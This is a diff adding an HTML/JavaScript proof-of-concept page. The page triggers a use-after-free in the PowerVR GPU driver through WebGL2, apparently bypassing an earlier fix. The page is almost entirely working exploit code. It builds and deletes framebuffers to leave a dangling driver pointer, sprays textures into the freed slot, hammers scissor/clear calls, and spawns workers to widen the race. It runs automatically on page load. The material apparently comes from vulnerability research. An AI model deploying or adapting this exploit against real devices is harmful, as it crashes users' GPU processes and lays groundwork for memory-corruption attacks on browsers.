@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>PoC</title></head>
+<body style="font-family:system-ui;margin:1em">
+<h3>PowerVR SetScissor UAF — fix bypass (ScopedBufferReattacher)</h3>
+<p>Needs a PowerVR/IMG device (Pixel 10). With MTE: clean SEGV_MTESERR in logcat.
+Without MTE: watch the counters below — a storm of <b>CONTEXT LOST</b> / a frozen page
+= the GPU process is crashing (evidence even without logcat).</p>
+<div style="font-size:20px;font-weight:bold">
+cycles: <span id="c">0</span> &nbsp;|&nbsp;
+<span style="color:#c00">CONTEXT LOST: <span id="x">0</span></span>
+</div>
+<pre id="log" style="background:#111;color:#3e6;padding:1em;white-space:pre-wrap"></pre>
+<script>
+const logEl=document.getElementById('log'), cEl=document.getElementById('c'), xEl=document.getElementById('x');
+let cycles=0, lost=0;
+const log=m=>{logEl.textContent=(new Date().toLocaleTimeString()+' '+m+'\n'+logEl.textContent).slice(0,4000);};
+function bump(n){cycles+=n;cEl.textContent=cycles;}
+function onLost(where){lost++;xEl.textContent=lost;log('CONTEXT LOST ('+where+') total='+lost+'  <-- GPU process likely crashed/UAF');}
+
+// One bypass cycle. Leaves driver "previous complete FBO" = freed user FBO A, then scissors.
+function cycle(onlost){
+  const canvas=new OffscreenCanvas(256,256);
+  const gl=canvas.getContext('webgl2',{antialias:false,depth:false,stencil:false});
+  if(!gl) return false;
+  try{ canvas.addEventListener('webglcontextlost',()=>onlost('offscreen')); }catch(e){}
+
+  const R=gl.createRenderbuffer();
+  gl.bindRenderbuffer(gl.RENDERBUFFER,R);
+  gl.renderbufferStorage(gl.RENDERBUFFER,gl.RGBA8,64,64);
+  const A=gl.createFramebuffer();
+  gl.bindFramebuffer(gl.FRAMEBUFFER,A);
+  gl.framebufferRenderbuffer(gl.FRAMEBUFFER,gl.COLOR_ATTACHMENT0,gl.RENDERBUFFER,R); // A complete
+
+  const Rb=gl.createRenderbuffer();
+  gl.bindRenderbuffer(gl.RENDERBUFFER,Rb);
+  gl.renderbufferStorage(gl.RENDERBUFFER,gl.RGBA8,64,64);
+  const B=gl.createFramebuffer();
+  gl.bindFramebuffer(gl.FRAMEBUFFER,B);
+  gl.framebufferRenderbuffer(gl.FRAMEBUFFER,gl.COLOR_ATTACHMENT0,gl.RENDERBUFFER,Rb); // current=B, A not current
+
+  // Resize R while attached to A -> ScopedBufferReattacher direct-binds A then B
+  // (bypasses complete_fbo_) -> driver "previous complete FBO" = A.
+  gl.bindRenderbuffer(gl.RENDERBUFFER,R);
+  gl.renderbufferStorage(gl.RENDERBUFFER,gl.RGBA8,128,128);
+
+  gl.deleteFramebuffer(A); // A not current -> not rebound -> "previous" dangles.
+
+  const pool=[]; // spray freed slot
+  for(let i=0;i<24;i++){const t=gl.createTexture();gl.bindTexture(gl.TEXTURE_2D,t);
+    gl.texImage2D(gl.TEXTURE_2D,0,gl.RGBA8,32,32,0,gl.RGBA,gl.UNSIGNED_BYTE,null);pool.push(t);}
+
+  gl.enable(gl.SCISSOR_TEST); // SetScissor derefs freed "previous complete FBO"
+  for(let i=0;i<64;i++){gl.scissor((Math.random()*40)|0,(Math.random()*40)|0,10,10);gl.clear(gl.COLOR_BUFFER_BIT);}
+  gl.flush();
+  return true;
+}
+
+function run(){
+  const tick=()=>{
+    for(let k=0;k<8;k++){ if(!cycle(onLost)){log('no webgl2');return;} }
+    bump(8);
+    setTimeout(tick,0);
+  };
+  tick();
+}
+
+// Widen the race/alloc window with worker copies (as in the original report).
+const wsrc=`const cycle=${cycle.toString()};
+onmessage=()=>{ (function t(){ let n=0; for(let k=0;k<8;k++){ if(cycle(()=>postMessage('lost'))) n++; }
+  postMessage(n); setTimeout(t,0); })(); };`;
+try{
+  const url=URL.createObjectURL(new Blob([wsrc],{type:'text/javascript'}));
+  for(let i=0;i<6;i++){ const w=new Worker(url);
+    w.onmessage=e=>{ if(e.data==='lost') onLost('worker'); else bump(e.data); };
+    w.postMessage(1); }
+}catch(e){ log('worker spawn failed: '+e); }
+
+run();
+</script>
+</body>
+</html>
